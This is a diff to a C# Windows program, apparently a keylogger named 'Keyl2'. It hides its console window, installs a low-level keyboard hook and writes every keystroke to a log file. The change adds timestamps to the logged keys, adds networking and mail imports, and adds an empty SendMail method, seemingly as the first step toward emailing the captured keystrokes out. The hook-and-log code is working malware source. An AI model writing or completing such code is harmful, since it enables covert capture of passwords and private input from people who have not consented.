@@ -3,6 +3,8 @@ using System.Windows.Forms;
 using System.Runtime.InteropServices;
 using System.IO;
 using System;
+using System.Net;
+using System.Net.Mail;
 
 namespace Keyl2
 {
@@ -39,11 +41,19 @@ namespace Keyl2
 
         static void Main(string[] args)
         {
+
             var handle = GetConsoleWindow();
             ShowWindow(handle, SW_HIDE);
             _hookID = SetHook(_proc);
             Application.Run();
             UnhookWindowsHookEx(_hookID);
+        }
+
+
+
+        static void SendMail() 
+        {
+
         }
 
         private static IntPtr SetHook(LowLevelKeyboardProc proc)
@@ -65,9 +75,10 @@ namespace Keyl2
             if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
             {
                 int vkCode = Marshal.ReadInt32(lParam);
+                
                 Console.WriteLine((Keys)vkCode);
                 StreamWriter sw = new StreamWriter(Application.StartupPath + @"\log.txt", true);
-                sw.Write((Keys)vkCode);
+                sw.Write($"{DateTime.Now}:{(Keys)vkCode}\n");
                 sw.Close();
             }
             return CallNextHookEx(_hookID, nCode, wParam, lParam);
